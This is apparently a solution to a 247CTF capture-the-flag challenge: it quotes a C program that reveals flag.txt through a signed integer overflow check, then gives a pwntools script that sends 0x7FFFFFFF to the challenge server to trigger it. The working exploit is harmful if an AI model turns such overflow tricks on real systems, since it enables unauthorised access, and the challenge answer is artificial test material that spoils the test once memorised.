"""
#include <stdio.h>
int main() {
    int impossible_number;
    FILE *flag;
    char c;
    if (scanf("%d", &impossible_number)) {
        if (impossible_number > 0 && impossible_number > (impossible_number + 1)) {
            flag = fopen("flag.txt","r");
            while((c = getc(flag)) != EOF) {
                printf("%c",c);
            }
        }
    }
    return 0;
}
"""

from pwnlib.tubes.remote import remote

conn = remote('8bad377f8c78b9a0.247ctf.com',50324)
# max signed integer size
conn.send(f'{0x7FFFFFFF}\r\n'.encode())
print(conn.recvline().rstrip().decode())
conn.close()